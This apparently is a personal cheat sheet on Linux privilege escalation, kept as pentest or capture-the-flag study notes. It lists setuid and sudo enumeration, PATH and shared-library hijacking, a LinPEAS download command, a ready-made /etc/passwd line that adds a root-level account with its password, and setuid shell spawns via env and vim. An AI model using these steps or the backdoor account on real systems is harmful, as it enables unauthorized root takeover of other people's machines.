## General Tips
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
- Find setuid binaries using `find / -perm -u=s -type f 2>/dev/null`
- Check `sudo` capabilities using `sudo -l`, see [[sudo]].
- Check cron jobs (`/etc/crontab`)
- Check running processes (`ps aux`)
## Changing Behaviour of Executables
Useful for setuid binaries or other stuff running as root.
### Path Change
You can change the `PATH` environment variable to change run commands on binaries you run.
The first entries in path have higher priority.
### Changing `/etc/hosts`
You can append to `/etc/hosts` or overwrite (you might have permissions to append but not write) in order to make an host point to another controlled host.
### Custom Shared library
In case the scripts loads a custom shared library you can overwrite, or loads libc from a location you can overwrite, you can fully control the functions in the library.
You can see if it tries to load a library from somewhere using `strace`.
You can exploit it by using a function `__attribute__((constructor))` that will run when the library is first resolved, that has a win code / asm shellcode if can't use libc.
## LinPEAS
Automatic Privilege Escalation enumeration script.
https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS
Download using `curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh > linpeas.sh`
You can use `scp` to get on server if it doesn't have internet access.
Run `linpeas.sh -s` for quick running.
## Getting root from /etc/passwd write
Add:
```
timmy:$1$WQHndChN$HkQUXIR5njLbQQyz/VSA8.:0:0:timmy:/root:/bin/bash
```
Then do `su timmy`. Password is `t1mmy`.
See [[etc passwd format]] for more details, if want to create manually.
## Common binaries that can escalate privileges
If they are setuid / allowed as sudo
- `env` - `env /bin/sh` spawns a shell.
- `vim` - open `/etc/passwd` and edit it